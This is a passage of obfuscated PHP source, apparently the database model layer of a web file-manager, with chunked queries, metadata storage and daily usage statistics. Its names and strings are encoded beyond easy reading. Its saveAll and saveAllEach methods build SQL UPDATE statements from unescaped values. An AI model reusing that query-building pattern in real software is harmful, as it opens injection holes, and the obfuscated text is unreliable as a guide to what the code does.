$‘º¤÷öÒ <= 1 ? 1 : $‘º¤÷öÒ; $îÉ¬±ÔÆ = array(); $Ë—«Êš = 1; if ($‘º¤÷öÒ == 1 && $Ë—«Êš) { $this->optionsValue($”ßñôäÂ); $îÉ¬±ÔÆ = $this->page($‘º¤÷öÒ, $ìÂèëŞ )->select(); $®¹Œ’ş¯ = is_array($îÉ¬±ÔÆ) ? count($îÉ¬±ÔÆ) : 0; if ($®¹Œ’ş¯ < $ìÂèëŞ ) { $ÕÏ´¶óâ = 1; } else { $this->optionsValue($Ğ²¬¦†); $®¹Œ’ş¯ = intval($this->count()); $ÕÏ´¶óâ = ceil($®¹Œ’ş¯ / $ìÂèëŞ ); } } else { $this->optionsValue($Ğ²¬¦†); $®¹Œ’ş¯ = intval($this->count()); $ÕÏ´¶óâ = ceil($®¹Œ’ş¯ / $ìÂèëŞ ); $‘º¤÷öÒ = $‘º¤÷öÒ >= $ÕÏ´¶óâ ? $ÕÏ´¶óâ : $‘º¤÷öÒ; $this->optionsValue($”ßñôäÂ); $îÉ¬±ÔÆ = $this->page($‘º¤÷öÒ, $ìÂèëŞ )->select(); } if (!is_array($îÉ¬±ÔÆ)) { $îÉ¬±ÔÆ = array(); } if ($ÕÏ´¶óâ == 1) { $®¹Œ’ş¯ = count($îÉ¬±ÔÆ); } $¸Ê„¾ = array($·ñú‡çô[370] => array($·ñú‡çô[371] => $®¹Œ’ş¯, $·ñú‡çô[367] => $ìÂèëŞ , $·ñú‡çô[357] => $‘º¤÷öÒ, $·ñú‡çô[372] => $ÕÏ´¶óâ), $·ñú‡çô[373] => $îÉ¬±ÔÆ); return $¸Ê„¾; } protected function checkLength($­ò¸ì¢, $•§õ‚û = 0, $¾ùüëø¨ = '') { $ïŠªûƒ¼ =& $_SERVER[¹àö™Ç¾]; $•§õ‚û = $•§õ‚û ? $•§õ‚û : 65536; if (!$­ò¸ì¢ || strlen($­ò¸ì¢) < $•§õ‚û) { return; } $¾ùüëø¨ = $¾ùüëø¨ ? $¾ùüëø¨ . $ïŠªûƒ¼[81] : $ïŠªûƒ¼[22]; show_json($¾ùüëø¨ . LNG($ïŠªûƒ¼[374]) . "\50{$•§õ‚û}\x29", !1); } protected function metaSet($ø†ËöÖ, $¸ÆÄâ·£ = null, $ıÊñ®ÕŒ = null) { $ò¬ÃÚç =& $_SERVER[¹àö™Ç¾]; if (!$this->tableMeta || !$ø†ËöÖ) { return !1; } $·îÀ†ŠÂ = $this->tableMeta[$ò¬ÃÚç[375]]; $ş÷éö¥¯ = $this->tableMeta[$ò¬ÃÚç[376]]; $µõíë = Model($ş÷éö¥¯); $°‰¸¯òï = array($·îÀ†ŠÂ => $ø†ËöÖ, $ò¬ÃÚç[377] => $¸ÆÄâ·£); if (is_null($¸ÆÄâ·£)) { return $µõíë->where(array($·îÀ†ŠÂ => $ø†ËöÖ))->delete(); } if (is_null($ıÊñ®ÕŒ) && is_string($¸ÆÄâ·£)) { return $µõíë->where($°‰¸¯òï)->delete(); } $ŸÑçÎé = is_array($¸ÆÄâ·£) ? $¸ÆÄâ·£ : array(); if (is_string($¸ÆÄâ·£)) { $ŸÑçÎé[$¸ÆÄâ·£] = $ıÊñ®ÕŒ; } $º†ØüÖ‹ = array(); foreach ($ŸÑçÎé as $¢õ ò¤‘ => $û’±…á…) { if (is_null($û’±…á…) && is_string($¢õ ò¤‘)) { $µõíë->where(array($·îÀ†ŠÂ => $ø†ËöÖ, $ò¬ÃÚç[377] => $¢õ ò¤‘))->delete(); continue; } $this->checkLength($û’±…á…, !1, $ş÷éö¥¯ . $ò¬ÃÚç[4] . $¢õ ò¤‘); $º†ØüÖ‹[] = array($·îÀ†ŠÂ => $ø†ËöÖ, $ò¬ÃÚç[105] => $¢õ ò¤‘, $ò¬ÃÚç[378] => $û’±…á…); } $†°ˆóòã = $ò¬ÃÚç[379] . $ş÷éö¥¯; CacheLock::lock($†°ˆóòã); $µõíë->where(array($·îÀ†ŠÂ => $ø†ËöÖ))->addAll($º†ØüÖ‹, array(), !0); CacheLock::unlock($†°ˆóòã); return !0; } public function metaGet($§…ÓøØ¤, $­Óïµ± = false) { $­†¾Ï— =& $_SERVER[¹àö™Ç¾]; if (!$this->tableMeta) { return array(); } $×¢÷­ ® = $this->tableMeta[$­†¾Ï—[375]]; $ÙÁßãú˜ = Model($this->tableMeta[$­†¾Ï—[376]]); if ($­Óïµ±) { $©‹¸˜Èí = array($×¢÷­ ® => $§…ÓøØ¤, $­†¾Ï—[105] => $­Óïµ±); return $ÙÁßãú˜->where($©‹¸˜Èí)->getField($­†¾Ï—[378]); } $©‹¸˜Èí = array($×¢÷­ ® => $§…ÓøØ¤); $ÉŠã»Óø = $ÙÁßãú˜->field($­†¾Ï—[380])->where($©‹¸˜Èí)->select(); $ÉŠã»Óø = array_to_keyvalue($ÉŠã»Óø, $­†¾Ï—[105], $­†¾Ï—[378]); return $ÉŠã»Óø; } private function checkDataAutoHas($²Íä©Ü”) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¥Ö‹Ù“¨) { if (in_array($²Íä©Ü”, explode($_SERVER[¹àö™Ç¾][60], $¥Ö‹Ù“¨[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ú±ú«“ƒ, $Ö¢øè‹È) { $Ø¤ƒÊÇŒ =& $_SERVER[¹àö™Ç¾]; if (!is_array($ú±ú«“ƒ)) { return; } foreach ($this->dataAuto as $¢ÊèÖ¦¹) { $Õ¤±œÕı = $¢ÊèÖ¦¹[0]; if (!in_array($Ö¢øè‹È, explode($Ø¤ƒÊÇŒ[60], $¢ÊèÖ¦¹[2]))) { continue; } switch (trim($¢ÊèÖ¦¹[3])) { case $Ø¤ƒÊÇŒ[325]: case $Ø¤ƒÊÇŒ[326]: $ç¡ÏºÂ¦ = $¢ÊèÖ¦¹[1]; $²¯×æèÑ = isset($¢ÊèÖ¦¹[4]) ? (array) $¢ÊèÖ¦¹[4] : array(); if ($ç¡ÏºÂ¦ == $Ø¤ƒÊÇŒ[206] && array_key_exists($Õ¤±œÕı, $ú±ú«“ƒ)) { if (!$ú±ú«“ƒ[$Õ¤±œÕı]) { unset($ú±ú«“ƒ[$Õ¤±œÕı]); } break; } if (isset($ú±ú«“ƒ[$Õ¤±œÕı])) { array_unshift($²¯×æèÑ, $ú±ú«“ƒ[$Õ¤±œÕı]); } if ($Ø¤ƒÊÇŒ[325] == $¢ÊèÖ¦¹[3]) { $ú±ú«“ƒ[$Õ¤±œÕı] = call_user_func_array($ç¡ÏºÂ¦, $²¯×æèÑ); } else { $ú±ú«“ƒ[$Õ¤±œÕı] = call_user_func_array(array(&$this, $ç¡ÏºÂ¦), $²¯×æèÑ); } break; case $Ø¤ƒÊÇŒ[274]: if (isset($ú±ú«“ƒ[$Õ¤±œÕı]) && $ú±ú«“ƒ[$Õ¤±œÕı]) { $ú±ú«“ƒ[$Õ¤±œÕı] = call_user_func_array(array(&$this, $¢ÊèÖ¦¹[1]), array($ú±ú«“ƒ[$Õ¤±œÕı])); } break; case $Ø¤ƒÊÇŒ[277]: $ú±ú«“ƒ[$Õ¤±œÕı] = $ú±ú«“ƒ[$¢ÊèÖ¦¹[1]]; break; case $Ø¤ƒÊÇŒ[298]: if (isset($ú±ú«“ƒ[$Õ¤±œÕı]) && !is_string($ú±ú«“ƒ[$Õ¤±œÕı])) { $ú±ú«“ƒ[$Õ¤±œÕı] = json_encode_force($ú±ú«“ƒ[$Õ¤±œÕı]); } break; case $Ø¤ƒÊÇŒ[327]: if ($ú±ú«“ƒ[$Õ¤±œÕı] === $Ø¤ƒÊÇŒ[22]) { unset($ú±ú«“ƒ[$Õ¤±œÕı]); } break; case $Ø¤ƒÊÇŒ[328]: $ú±ú«“ƒ[$Õ¤±œÕı] = $¢ÊèÖ¦¹[1]; default: break; } } if ($Ö¢øè‹È == $Ø¤ƒÊÇŒ[359]) { $Àâğ´‘• = strtolower($this->db->getDbType()); if (strpos($Àâğ´‘•, $Ø¤ƒÊÇŒ[23]) !== 0) { return; } $Ë İÊìä = $this->field(!0)->fields; $µ„öçğ› = $Ë İÊìä[$Ø¤ƒÊÇŒ[256]]; if (isset($Ë İÊìä[$Ø¤ƒÊÇŒ[255]])) { unset($µ„öçğ›[$Ë İÊìä[$Ø¤ƒÊÇŒ[255]]]); } foreach ($µ„öçğ› as $¯ÁÎ—ì  => $Ö¢øè‹È) { if (!isset($ú±ú«“ƒ[$¯ÁÎ—ì ])) { $ú±ú«“ƒ[$¯ÁÎ—ì ] = $Ø¤ƒÊÇŒ[22]; } } } } private function dataAfterFilter(&$Ùòšîß) { $Õ­°Ïæ =& $_SERVER[¹àö™Ç¾]; foreach ($this->dataAuto as $”ª¢Ğ‹) { $Ùª§’“ô = $”ª¢Ğ‹[0]; if (!isset($Ùòšîß[$Ùª§’“ô])) { continue; } if (!in_array($Õ­°Ïæ[361], explode($Õ­°Ïæ[60], $”ª¢Ğ‹[2]))) { continue; } switch (trim($”ª¢Ğ‹[3])) { case $Õ­°Ïæ[325]: case $Õ­°Ïæ[326]: $ğë¨¤ÃÒ = isset($”ª¢Ğ‹[4]) ? (array) $”ª¢Ğ‹[4] : array(); array_unshift($ğë¨¤ÃÒ, $Ùòšîß[$Ùª§’“ô]); if (isset($”ª¢Ğ‹[4]) && $”ª¢Ğ‹[4] == $Õ­°Ïæ[381]) { $ğë¨¤ÃÒ = array($Ùòšîß[$Ùª§’“ô]); } if ($Õ­°Ïæ[325] == $”ª¢Ğ‹[3]) { $Ùòšîß[$Ùª§’“ô] = call_user_func_array($”ª¢Ğ‹[1], $ğë¨¤ÃÒ); } else { $Ùòšîß[$Ùª§’“ô] = call_user_func_array(array(&$this, $”ª¢Ğ‹[1]), $ğë¨¤ÃÒ); } break; case $Õ­°Ïæ[274]: if (isset($Ùòšîß[$Ùª§’“ô]) && $Ùòšîß[$Ùª§’“ô]) { $Ùòšîß[$Ùª§’“ô] = call_user_func_array(array(&$this, $”ª¢Ğ‹[1]), array($Ùòšîß[$Ùª§’“ô])); } break; case $Õ­°Ïæ[277]: $Ùòšîß[$Ùª§’“ô] = $Ùòšîß[$”ª¢Ğ‹[1]]; break; case $Õ­°Ïæ[298]: $³š²­ = $Ùòšîß[$Ùª§’“ô]; $Ùòšîß[$Ùª§’“ô] = json_decode($³š²­, !0); if (is_null($Ùòšîß[$Ùª§’“ô])) { $Ùòšîß[$Ùª§’“ô] = $³š²­; } break; case $Õ­°Ïæ[327]: if ($Ùòšîß[$Ùª§’“ô] === $Õ­°Ïæ[22]) { unset($Ùòšîß[$Ùª§’“ô]); } break; case $Õ­°Ïæ[328]: $Ùòšîß[$Ùª§’“ô] = $”ª¢Ğ‹[1]; break; default: break; } } } public function saveAll($øşÄ½Ò‰) { $ßÔ¸ˆÁ˜ =& $_SERVER[¹àö™Ç¾]; $Æ£û¤Öä = $this->tablePrefix . $this->tableName; $øŞä„Úè = self::SQL_WHERE_IN_CHUNK; $øşÄ½Ò‰ = is_array($øşÄ½Ò‰) ? $øşÄ½Ò‰ : array(); $àöÆÒÁ´ = $ßÔ¸ˆÁ˜[382]; $òÛÒÈÓå = 0; $«ôø†ô“ = array(); $¹ÎüºÙ¿ = count($øşÄ½Ò‰); for ($·†Ñ—ÔÑ = 0; $·†Ñ—ÔÑ < $¹ÎüºÙ¿; $·†Ñ—ÔÑ++) { $¤ª•·¸è = $øşÄ½Ò‰[$·†Ñ—ÔÑ]; if (!is_array($¤ª•·¸è) || count($¤ª•·¸è) != 4) { continue; } $ï¿¥ªä = "\125\120\x44\101\124\105\x20\x60{$Æ£û¤Öä}\x60\x20\x53\105\124\40{$¤ª•·¸è[2]}\x20\x3d\40\103\101\123\x45\x20{$¤ª•·¸è[0]}\x20\12"; if ($òÛÒÈÓå == 0) { $àöÆÒÁ´ = $ï¿¥ªä; } $«ôø†ô“[] = $ßÔ¸ˆÁ˜[127] . $¤ª•·¸è[1] . $ßÔ¸ˆÁ˜[127]; $òÛÒÈÓå++; $àöÆÒÁ´ .= "\x20\x57\x48\x45\x4e\40\47{$¤ª•·¸è[1]}\x27\x20\x54\110\x45\116\40\x27{$¤ª•·¸è[3]}\x27\x20\xa"; if ($òÛÒÈÓå == $øŞä„Úè || $·†Ñ—ÔÑ == $¹ÎüºÙ¿ - 1) { $æ“®ŒÛ± = implode($ßÔ¸ˆÁ˜[60], $«ôø†ô“); $àöÆÒÁ´ .= "\40\105\116\104\40\40\127\110\x45\122\105\40{$¤ª•·¸è[0]}\40\x49\x4e\x20\x28{$æ“®ŒÛ±}\51\x20"; $this->execute($àöÆÒÁ´); $òÛÒÈÓå = 0; $àöÆÒÁ´ = $ï¿¥ªä; $this->chunkEventCheck(count($«ôø†ô“)); $«ôø†ô“ = array(); } } $this->chunkEventSet(); } public function saveAllEach($·‚´‰Êã) { $ÂïºáÂ =& $_SERVER[¹àö™Ç¾]; $ÄÂÄÊı§ = $this->tablePrefix . $this->tableName; foreach ($·‚´‰Êã as $¯àìş›Û) { if (!is_array($¯àìş›Û) || count($¯àìş›Û) != 4) { continue; } $Œ³äé = $¯àìş›Û[0] . $ÂïºáÂ[383] . $¯àìş›Û[1] . $ÂïºáÂ[127]; $˜¡ªö“µ = $¯àìş›Û[2] . $ÂïºáÂ[383] . $¯àìş›Û[3] . $ÂïºáÂ[127]; $‡áÃ¤—º = "\165\x70\144\x61\x74\145\40{$ÄÂÄÊı§}\x20\163\x65\x74\x20{$˜¡ªö“µ}\x20\x77\150\145\162\x65\40{$Œ³äé}\x3b"; $this->execute($‡áÃ¤—º); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¸üß¡Ø¬ = false, $³—‘¿†µ = false) { $this->_chunkEvent = $¸üß¡Ø¬; $this->_chunkEventParam = $³—‘¿†µ; } private function chunkEventCheck($÷ÚñÁè) { if (!$this->_chunkEvent) { return; } $®·ì¡Ä€ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $®·ì¡Ä€[$_SERVER[¹àö™Ç¾][384]] = $÷ÚñÁè; Hook::trigger($this->_chunkEvent, $®·ì¡Ä€); } public function addAll($õõ¯§Ñ, $¹ã– Ä = array(), $¥¯÷÷¸û = false) { $Ñû’®ä© =& $_SERVER[¹àö™Ç¾]; ignore_timeout(); $”‡°˜ñ‘ = self::SQL_WHERE_IN_CHUNK; if (empty($õõ¯§Ñ)) { $this->error = think_lang($Ñû’®ä©[275]); return !1; } $¹ã– Ä = $this->_parseOptions($¹ã– Ä); foreach ($õõ¯§Ñ as $¯Åéõ¢ => $‰‰ß‘›ß) { $õõ¯§Ñ[$¯Åéõ¢] = $this->_facade($‰‰ß‘›ß); $this->_beforeInsert($õõ¯§Ñ[$¯Åéõ¢], $¹ã– Ä); } if (method_exists($this->db, $Ñû’®ä©[276])) { for ($×„Ìö…— = 0; $×„Ìö…— < count($õõ¯§Ñ); $×„Ìö…— += $”‡°˜ñ‘) { $•Ä­‡à¦ = array_slice($õõ¯§Ñ, $×„Ìö…—, $”‡°˜ñ‘); if (!is_array($•Ä­‡à¦) || count($•Ä­‡à¦) == 0) { break; } $¶®ÉÇ½û = $this->db->insertAll($•Ä­‡à¦, $¹ã– Ä, $¥¯÷÷¸û); $this->chunkEventCheck(count($•Ä­‡à¦)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($õõ¯§Ñ as $¯Åéõ¢ => $‰‰ß‘›ß) { $¶®ÉÇ½û = $this->db->insert($‰‰ß‘›ß, $¹ã– Ä, $¥¯÷÷¸û); } $this->commit(); } if (!1 !== $¶®ÉÇ½û) { $Ò«³¬ı = $this->getLastInsID(); if ($Ò«³¬ı) { return $Ò«³¬ı; } } return $¶®ÉÇ½û; } public function save($§ØŞ°›Ğ = '', $Å±µô¢¢ = array()) { $ñËÂ¾¾ò =& $_SERVER[¹àö™Ç¾]; $ßş£ïœº = self::SQL_WHERE_IN_CHUNK; $„À´ã¬ = $this->optionsValue(); $”Šªšø‡ = $this->findWhereField($„À´ã¬); if (!$”Šªšø‡) { return parent::save($§ØŞ°›Ğ, $Å±µô¢¢); } $¶ÁØŸ½ì = 0; $äõƒ†ğ = $„À´ã¬[$ñËÂ¾¾ò[279]][$”Šªšø‡][1]; $äõƒ†ğ = is_array($äõƒ†ğ) ? $äõƒ†ğ : array(); $Öºïø‚÷ = count($äõƒ†ğ); for ($šŞÁè€Ö = 0; $šŞÁè€Ö < $Öºïø‚÷; $šŞÁè€Ö += $ßş£ïœº) { $²æÒ¯Ü½ = array_slice($äõƒ†ğ, $šŞÁè€Ö, $ßş£ïœº); if (!is_array($²æÒ¯Ü½) || count($²æÒ¯Ü½) == 0) { break; } $„À´ã¬[$ñËÂ¾¾ò[279]][$”Šªšø‡][1] = $²æÒ¯Ü½; $this->optionsValue($„À´ã¬); $¶ÁØŸ½ì += parent::save($§ØŞ°›Ğ, $Å±µô¢¢); $this->chunkEventCheck(count($²æÒ¯Ü½)); } $this->chunkEventSet(); return $¶ÁØŸ½ì; } public function add($§šõõèÌ = '', $©ı‹¾Ê = array(), $¾°¸ıà« = false) { if ($this->addTaskStatus && is_array($§šõõèÌ)) { $this->addTaskData[] = $§šõõèÌ; return; } return parent::add($§šõõèÌ, $©ı‹¾Ê, $¾°¸ıà«); } public function parseWhereLike($àğûŒ×², $œñ¾¤ä¸ = '', $ˆ‰Ù•Ã = false, &$•ìì¼ïã = false) { $ö£¶Ç =& $_SERVER[¹àö™Ç¾]; $ÙÖç×¼ö = $GLOBALS[$ö£¶Ç[16]][$ö£¶Ç[385]]; if (!$ÙÖç×¼ö[$ö£¶Ç[386]]) { return $àğûŒ×²; } if (!is_array($àğûŒ×²)) { return $àğûŒ×²; } $×Äü×Í½ = array(); $‘Å…ÉÕÃ = 0; foreach ($àğûŒ×² as $‰ÙÔ›’– => $“²¾Å„ã) { if (is_array($“²¾Å„ã) && count($“²¾Å„ã) == 2 && $“²¾Å„ã[0] == $ö£¶Ç[387] && is_string($“²¾Å„ã[1]) && substr($“²¾Å„ã[1], 0, 1) == $ö£¶Ç[388] && substr($“²¾Å„ã[1], strlen($“²¾Å„ã[1]) - 1, 1) == $ö£¶Ç[388]) { $•ìì¼ïã = !0; $¹÷š•éí = is_string($‰ÙÔ›’–) ? $‰ÙÔ›’– : $œñ¾¤ä¸; $ÒïêÕ½¨ = substr($“²¾Å„ã[1], 1, strlen($“²¾Å„ã[1]) - 2); $ÒïêÕ½¨ = $this->db->escapeString($ÒïêÕ½¨); if (!strpos($¹÷š•éí, $ö£¶Ç[20])) { $¹÷š•éí = $ö£¶Ç[389] . $¹÷š•éí . $ö£¶Ç[389]; } $´¹¥ò»ã = $ö£¶Ç[191] . $ÒïêÕ½¨ . $ö£¶Ç[191]; if ($ÙÖç×¼ö[$ö£¶Ç[390]]) { $´¹¥ò»ã = $ö£¶Ç[391] . $ÒïêÕ½¨ . $ö£¶Ç[392]; if ($ÙÖç×¼ö[$ö£¶Ç[393]]) { $´¹¥ò»ã = $ö£¶Ç[392] . $ÒïêÕ½¨ . $ö£¶Ç[391]; } } $×Äü×Í½[$‘Å…ÉÕÃ] = $ö£¶Ç[394] . $¹÷š•éí . $ö£¶Ç[395] . $´¹¥ò»ã . $ö£¶Ç[396]; $‘Å…ÉÕÃ++; continue; } if (is_array($“²¾Å„ã)) { $œñ¾¤ä¸ = is_string($‰ÙÔ›’–) ? $‰ÙÔ›’– : $œñ¾¤ä¸; $“²¾Å„ã = $this->parseWhereLike($“²¾Å„ã, $œñ¾¤ä¸, !0, $•ìì¼ïã); } if (is_numeric($‰ÙÔ›’–)) { $×Äü×Í½[$‘Å…ÉÕÃ] = $“²¾Å„ã; $‘Å…ÉÕÃ++; } else { $×Äü×Í½[$‰ÙÔ›’–] = $“²¾Å„ã; } } if ($•ìì¼ïã && !$ˆ‰Ù•Ã) { } return $×Äü×Í½; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ıª±¼øê = array()) { $ïÒÌÁ€ =& $_SERVER[¹àö™Ç¾]; $³ú×Û´ = self::SQL_WHERE_IN_CHUNK; $ÖŞ¾«² = $this->optionsValue(); $¼·¥°İ = $this->findWhereField($ÖŞ¾«²); if (!$¼·¥°İ || isset($ÖŞ¾«²[$ïÒÌÁ€[296]]) || isset($ÖŞ¾«²[$ïÒÌÁ€[357]])) { return parent::select($ıª±¼øê); } $à«¼øí = $ÖŞ¾«²[$ïÒÌÁ€[279]][$¼·¥°İ][1]; $à«¼øí = is_array($à«¼øí) ? $à«¼øí : array(); $ÆæŸ–Ø¹ = null; for ($‘Ëå¡‡ = 0; $‘Ëå¡‡ < count($à«¼øí); $‘Ëå¡‡ += $³ú×Û´) { $•»ïòË‘ = array_slice($à«¼øí, $‘Ëå¡‡, $³ú×Û´); if (!is_array($•»ïòË‘) || count($•»ïòË‘) == 0) { break; } $ÖŞ¾«²[$ïÒÌÁ€[279]][$¼·¥°İ][1] = $•»ïòË‘; $this->optionsValue($ÖŞ¾«²); $‡¡‹ò„ = parent::select($ıª±¼øê); if (!$‡¡‹ò„) { continue; } $ÆæŸ–Ø¹ = is_array($ÆæŸ–Ø¹) ? $ÆæŸ–Ø¹ : array(); $ÆæŸ–Ø¹ = array_merge($ÆæŸ–Ø¹, $‡¡‹ò„); } return $ÆæŸ–Ø¹; } public function delete($´æ•Àî× = array()) { $Õû°¦ =& $_SERVER[¹àö™Ç¾]; $¬Î¬Ç = self::SQL_WHERE_IN_CHUNK; $—ş„Û¨À = $this->optionsValue(); $Å¼•Öòñ = $this->findWhereField($—ş„Û¨À); if (!$Å¼•Öòñ) { return parent::delete($´æ•Àî×); } $øÙĞàŞ¬ = 0; $—´ËÂÂ = $—ş„Û¨À[$Õû°¦[279]][$Å¼•Öòñ][1]; $—´ËÂÂ = is_array($—´ËÂÂ) ? $—´ËÂÂ : array(); for ($ô’Şğâ = 0; $ô’Şğâ < count($—´ËÂÂ); $ô’Şğâ += $¬Î¬Ç) { $şêÅñÁØ = array_slice($—´ËÂÂ, $ô’Şğâ, $¬Î¬Ç); if (!is_array($şêÅñÁØ) || count($şêÅñÁØ) == 0) { break; } $—ş„Û¨À[$Õû°¦[279]][$Å¼•Öòñ][1] = $şêÅñÁØ; $this->optionsValue($—ş„Û¨À); $øÙĞàŞ¬ += parent::delete($´æ•Àî×); } return $øÙĞàŞ¬; } private function findWhereField($›¶ºÙş±) { $÷Í¼Îë€ =& $_SERVER[¹àö™Ç¾]; $ËÆÇ÷ğ„ = self::SQL_WHERE_IN_CHUNK; if (!is_array($›¶ºÙş±) || !is_array($›¶ºÙş±[$÷Í¼Îë€[279]])) { return !1; } foreach ($›¶ºÙş±[$÷Í¼Îë€[279]] as $€ÃÑğö => $¶¢æ¨§Ï) { if (is_array($¶¢æ¨§Ï) && isset($¶¢æ¨§Ï[0]) && is_string($¶¢æ¨§Ï[0]) && strtolower($¶¢æ¨§Ï[0]) == $÷Í¼Îë€[17] && is_array($¶¢æ¨§Ï[1]) && count($¶¢æ¨§Ï[1]) > $ËÆÇ÷ğ„) { ignore_timeout(); return $€ÃÑğö; } } return !1; } public function setMasterDB($ğÑ¶ÜŠ = true) { think_config($_SERVER[¹àö™Ç¾][397], $ğÑ¶ÜŠ); } } goto c°˜†ì¸; f»ç„óìË: class AnalysisModel extends ModelBaseLight { public function init($ˆ•ÕÇò¶) { $ªİ“ğË° =& $_SERVER[¹àö™Ç¾]; $ÛÀµºÓü = array($ªİ“ğË°[594] => array($ªİ“ğË°[43] => $ªİ“ğË°[1737], $ªİ“ğË°[277] => array($ªİ“ğË°[229], $ªİ“ğË°[757], $ªİ“ğË°[1738], $ªİ“ğË°[1739])), $ªİ“ğË°[1740] => array($ªİ“ğË°[43] => $ªİ“ğË°[1741], $ªİ“ğË°[277] => array($ªİ“ğË°[229], $ªİ“ğË°[755], $ªİ“ğË°[1742], $ªİ“ğË°[1743], $ªİ“ğË°[1744]))); if (!isset($ÛÀµºÓü[$ˆ•ÕÇò¶])) { return !1; } $this->optionType = $ÛÀµºÓü[$ˆ•ÕÇò¶][$ªİ“ğË°[43]]; $this->field = $ÛÀµºÓü[$ˆ•ÕÇò¶][$ªİ“ğË°[277]]; return !0; } public function listData($ÎÕËùã« = false, $¢ÇíßŸ› = "\x6d\157\x64\151\146\x79\x54\x69\x6d\x65", $ Ğ‹çö = false) { return parent::listData($ÎÕËùã«, $¢ÇíßŸ›, $ Ğ‹çö); } public function trendList($äÌï×ûË) { $©Ø™ˆòË =& $_SERVER[¹àö™Ç¾]; $’Æ½áì• = $this->listData(); if ($’Æ½áì•) { $¯›àğèò = end($’Æ½áì•); $ÖÛñı¥Ú = date($©Ø™ˆòË[1745], strtotime($©Ø™ˆòË[1746])); if ($¯›àğèò[$©Ø™ˆòË[229]] == $ÖÛñı¥Ú) { return $’Æ½áì•; } $³ÀÕÚ¥ = strtotime($¯›àğèò[$©Ø™ˆòË[229]]); } if (!isset($³ÀÕÚ¥)) { $›ÎÛŞ»Ñ = $äÌï×ûË == $©Ø™ˆòË[594] ? $©Ø™ˆòË[538] : $©Ø™ˆòË[817]; $³ÀÕÚ¥ = Model($›ÎÛŞ»Ñ)->min($©Ø™ˆòË[203]); } $……ù· = $©Ø™ˆòË[1747] . ucfirst($äÌï×ûË); $û±ĞùÀş = $this->dateList($³ÀÕÚ¥); foreach ($û±ĞùÀş as $ÖÛñı¥Ú) { $this->{$……ù·}($ÖÛñı¥Ú); } return $this->listData(); } private function dateList($ÙŠ¯‡É¼) { $€µÁ‚´ =& $_SERVER[¹àö™Ç¾]; $£ğÜ„øÁ = $ÙŠ¯‡É¼; $ ®‘óÀ = strtotime($€µÁ‚´[1746]); $£ßŒøÛ = array(); while ($£ğÜ„øÁ <= $ ®‘óÀ) { $£ßŒøÛ[] = date($€µÁ‚´[1745], $£ğÜ„øÁ); $£ğÜ„øÁ = strtotime($€µÁ‚´[1748], $£ğÜ„øÁ); } return $£ßŒøÛ; } public function _recordUser($Ô®ûï® = '') { $¹ò¯İŠ =& $_SERVER[¹àö™Ç¾]; $€®ÈŠ³ª = strtotime(date($¹ò¯İŠ[1749], strtotime($Ô®ûï®))); $ûŠŸ ¼ˆ = strtotime(date($¹ò¯İŠ[1750], strtotime($Ô®ûï®))); $‹¥Á™»‹ = array($¹ò¯İŠ[203] => array($¹ò¯İŠ[998], $ûŠŸ ¼ˆ)); $ÊĞ¸à¡‰ = Model($¹ò¯İŠ[538])->where($‹¥Á™»‹)->count($¹ò¯İŠ[1640]); $‹¥Á™»‹[$¹ò¯İŠ[203]] = array($¹ò¯İŠ[337], array($€®ÈŠ³ª, $ûŠŸ ¼ˆ)); $³…¿üóğ = Model($¹ò¯İŠ[538])->where($‹¥Á™»‹)->count($¹ò¯İŠ[1640]); $‹¥Á™»‹[$¹ò¯İŠ[43]] = $¹ò¯İŠ[1751]; $¥½®š— = Model($¹ò¯İŠ[1752])->where($‹¥Á™»‹)->count($¹ò¯İŠ[1753]); $´Ã·ÆÛ = array($¹ò¯İŠ[229] => $Ô®ûï®, $¹ò¯İŠ[757] => (int) $ÊĞ¸à¡‰, $¹ò¯İŠ[1738] => (int) $³…¿üóğ, $¹ò¯İŠ[1739] => (int) $¥½®š—); return $this->insert($´Ã·ÆÛ); } public function _recordStore($í¾ıÎ± = '') { $»‹™Í÷Ï =& $_SERVER[¹àö™Ç¾]; $ÏÂ©€üî = strtotime(date($»‹™Í÷Ï[1750], strtotime($í¾ıÎ±))); $îŒˆÆ = array($»‹™Í÷Ï[203] => array($»‹™Í÷Ï[998], $ÏÂ©€üî)); $ˆ¬Ò† = Model($»‹™Í÷Ï[470])->where($îŒˆÆ)->sum($»‹™Í÷Ï[90]); $îŒˆÆ[$»‹™Í÷Ï[411]] = 0; $Ãä¸ö¿¦ = Model($»‹™Í÷Ï[817])->where($îŒˆÆ)->sum($»‹™Í÷Ï[90]); $îŒˆÆ[$»‹™Í÷Ï[412]] = 1; $¸•Ïäƒ™ = Model($»‹™Í÷Ï[817])->where($îŒˆÆ)->sum($»‹™Í÷Ï[90]); $îŒˆÆ[$»‹™Í÷Ï[412]] = 2; $óıªîì = Model($»‹™Í÷Ï[817])->where($îŒˆÆ)->sum($»‹™Í÷Ï[90]); $ÉÂ¡Š¤ = array($»‹™Í÷Ï[229] => $í¾ıÎ±, $»‹™Í÷Ï[755] => (int) $Ãä¸ö¿¦, $»‹™Í÷Ï[1742] => (int) $ˆ¬Ò†, $»‹™Í÷Ï[1743] => (int) $¸•Ïäƒ™, $»‹™Í÷Ï[1744] => (int) $óıªîì); return $this->insert($ÉÂ¡Š¤); } public function trend($¬À¿Õ†ç, $‚›Šç‡Ó) { $Ã½êØ¨— =& $_SERVER[¹àö™Ç¾]; if (!$this->init($¬À¿Õ†ç)) { return !1; } $Õ¢œùı¹ = $this->trendList($¬À¿Õ†ç); if ($Õ¢œùı¹ && $‚›Šç‡Ó != $Ã½êØ¨—[1613]) { $õìƒ“üù = $Õ¢œùı¹[0][$Ã½êØ¨—[229]]; $ïğ‘šĞ = $this->validDate($‚›Šç‡Ó, $õìƒ“üù); $íÎÜïµĞ = array(); $“–Ö…ó = array_to_keyvalue($Õ¢œùı¹, $Ã½êØ¨—[229]); foreach ($ïğ‘šĞ as $¦ã–ƒøê) { if (isset($“–Ö…ó[$¦ã–ƒøê])) { $Å±Áâàñ = $“–Ö…ó[$¦ã–ƒøê]; } else { $Å±Áâàñ = end($Õ¢œùı¹); $Å±Áâàñ[$Ã½êØ¨—[229]] 